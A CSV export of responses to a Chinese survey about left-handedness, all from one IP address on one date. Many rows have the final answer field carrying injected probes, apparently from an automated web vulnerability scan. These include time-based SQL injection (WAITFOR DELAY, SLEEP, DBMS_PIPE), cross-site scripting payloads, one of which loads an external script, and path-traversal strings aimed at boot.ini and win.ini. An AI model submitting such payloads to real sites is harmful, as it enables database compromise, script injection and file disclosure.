id,topic1,topic2,topic3,topic4,topic5,topic6,topic7,topic8,topic9,topic10,topic11,topic12,topic13,topic14,topic15,topic16,topic17,topic18,topic19,topic20,topic21,topic22,topic23,topic24,topic25,topic26,topic27,topic28,topic29,topic30,qt1,qt2,qt3,qt4,qt5,qt6,qt7,qt8,qt9,qt10,qt11,qt12,qt13,qt14,qt15,qt16,qt17,qt18,qt19,qt20,qt21,qt22,qt23,qt24,qt25,qt26,qt27,qt28,qt29,qt30,comment,addip,addtime
1418,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1419,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字 WAITFOR DELAY '0:0:5' --,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1420,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1421,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字) WAITFOR DELAY '0:0:5' --,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1422,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1423,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字') WAITFOR DELAY '0:0:5' --,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1424,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1425,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字')) WAITFOR DELAY '0:0:5' --,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1426,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1427,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字 AND SLEEP(5),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1428,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1429,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字 AND SLEEP(5) #,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1430,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1431,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1432,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1433,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1434,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1435,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1436,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1437,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1438,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1439,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字AND 1997=DBMS_PIPE.RECEIVE_MESSAGE(CHR(115)||CHR(99)||CHR(97)||CHR(100),5)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1440,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1441,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<script>alert(42873)</script>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1442,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<img src=1 onerror=alert(42873)>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1443,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<div style=width:expression(alert(42873))>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1444,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<script src=http://xxooxxoo.js></script>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1445,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1446,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字"" onmousemove=alert(42873) wb=""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1447,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<a href=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#50&#51&#52&#53&#41>TEST</a>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1448,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字"" onmousemove='alert(42873)'wb=""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1449,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字"" onmouseover=prompt(42873) bad=""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1452,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<iframe SRC=javascript:alert(42873)>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1454,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<body ONLOAD=alert(42873)>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1455,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mjg3Myk8L3NjcmlwdD4=>",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1456,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<EMBED SRC=javascript:alert(42873)></EMBED>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1457,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字<BASE HREF=""javascript:alert(42873);//"">",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1458,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字"" onmouseover=propromptmpt(42873) bad=""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1459,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字<iframe src=http://xxooxxoo.js>,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1460,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1461,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字%27,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1462,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1463,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字\',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1464,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字\""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1465,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字JyI=,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1466,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字'""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1468,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字?',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1469,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字e360,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1470,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字6633x3X6,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1471,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字'""\'\""%27=?'?",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1472,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字'[.](,.)(""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1473,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字[],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1474,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字??,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1475,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,"立即纠正，因为自古都是右手写字'""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1476,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1477,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1478,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字!((),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1479,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字alert(42873),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1480,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../../../../../../../../boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1481,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../../../../../../../../boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1482,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,????????????????????????????????????????????????boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1483,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../../../../../../../../boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1484,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../../../../../../../../boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1485,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1486,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,C:\boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1487,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,..\..\..\..\..\..\..\..\boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1488,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../..//../..//../..//../..//../..//../..//../..//../..//boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1489,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1491,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1493,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1494,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1495,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,..??..??..??..??..??..??..??..??boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1496,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,<..\..\..\..\..\..\..\..\boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1497,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,|..\..\..\..\..\..\..\..\boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1499,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1501,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1503,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1505,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1506,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../../../../../../../../boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1508,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1510,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,../../../../../../../../boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1511,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1513,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1514,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,file:///c:/boot.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1515,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1516,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1517,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1518,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1519,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,................windowswin.ini,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1520,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
